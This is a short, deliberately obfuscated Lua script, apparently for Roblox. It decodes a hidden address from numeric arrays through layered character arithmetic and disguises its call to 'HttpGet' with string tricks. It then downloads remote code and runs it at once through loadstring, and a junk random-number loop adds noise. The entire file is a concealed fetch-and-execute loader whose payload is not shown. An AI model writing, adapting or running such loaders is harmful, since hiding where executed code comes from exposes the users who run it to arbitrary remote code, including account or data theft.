local A,B,C,D=game,string,table,math
do local z=0 for i=1,15 do z=z+D.random(2,8) end end
local function F(x)
	local r={}
	for i=#x,1,-1 do
		r[#r+1]=B.char(((x[i]+19)~27)-15)
	end
	return C.concat(r)
end
local function G(s)
	local o={}
	for i=1,#s do
		o[i]=B.char(s:byte(i)-2)
	end
	return C.concat(o)
end
local P1={90,84,85,85,79,77,18,17,17}
local P2={91,78,90,92,75,83,92,91}
local P3={24,76,77,77,17,45,82,81,82}
local P4={26,15,12,18,15,14,26,66,79,58}
local U=G(F(P1)..F(P2)..F(P3)..F(P4))
local Q=A
local R=Q[(function() return ("H"):gsub(".",function()return"HttpGet"end) end)()]
local S=(function(x)return(function(y)return y end)(x)end)
S(loadstring(R(Q,U)))()
